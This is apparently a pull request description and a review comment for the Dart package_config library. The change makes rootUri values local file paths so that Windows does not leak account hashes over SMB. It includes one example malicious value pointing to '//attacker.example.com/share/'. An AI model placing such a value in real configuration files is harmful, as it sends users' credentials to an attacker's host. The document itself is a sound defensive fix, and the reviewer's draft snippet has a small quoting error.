## Description
On Windows a `package_config.json`, crafted by a malicious actor, can point to an external UNC network share (e.g. `"rootUri": "//attacker.example.com/share/"`). 

Downstream tools (`analyzer`, `pub`, etc) that attempt to read from such a path (or just `File.statSync`) may trigger Windows to initiate an SMB request which the attacker can use to [record the user's account hashes](https://attack.mitre.org/techniques/T1187/).

To mitigate this issue, we require that `rootUri`s inside `package_config.json` must be a local file path.

For users who legitimately have `package_config.json` on a network share, the solution is to mount these network shares as local drive letters (like `Z:\`).

[2026-08-26 11:39Z, 2mo ago] lrhn left inline review comment on pkgs/package_config/lib/src/package_config.dart:
    What is the actual restriction here?
    
    It's not a _windows_ restriction, it applies to all platforms, and it should be expressed in a way that can be understood without converting to a windows path.
    
    A root URI that is a file URI must:
    * Not have a non-empty authority part. 
    * Not have a path that starts with `//`.
    
    A `file:` URI always has an authority part, but it should be empty, meaning an empty host, a default/empty port and no user-id, so `.authority.isEmpty`.
    
    Then it must not have a path that starts with `//`, because that will be converted to a Windows path starting with `\\`, so `!root.path.startsWith('//')`.
    
    Aka: it must start with `file:///` and not be followed by `/`. It's probably a `_SimpleUri`, so doing `toString()` is free, so we can introduce a central check for that:
    ```dart
      bool hasSimpleFilePath(Uri uri) =>
        !uri.isScheme('file) ||
            uri.authority.isEmpty && !uri.path.startsWith('//');
    ```
    and do;
    ```dart
      if (!fatalError && !hasSimpleFilePath(root)) {
        // Badness. 
        fatalError = true;
      }
    ```
    
    (Do we need to check for  a path of `/%2f...` or `/%5c...`, the escapes for `/` and `\`? Doesn't seem so, they generate an "invalid character in path" error from `_toWindowsFilePath`.).
    
    The URI must probably also not have an empty path, `file://` is a valid URI with an empty authority and empty path, but we already checked above that it `isAbsoluteDirectoryUri`, so that should be covered.
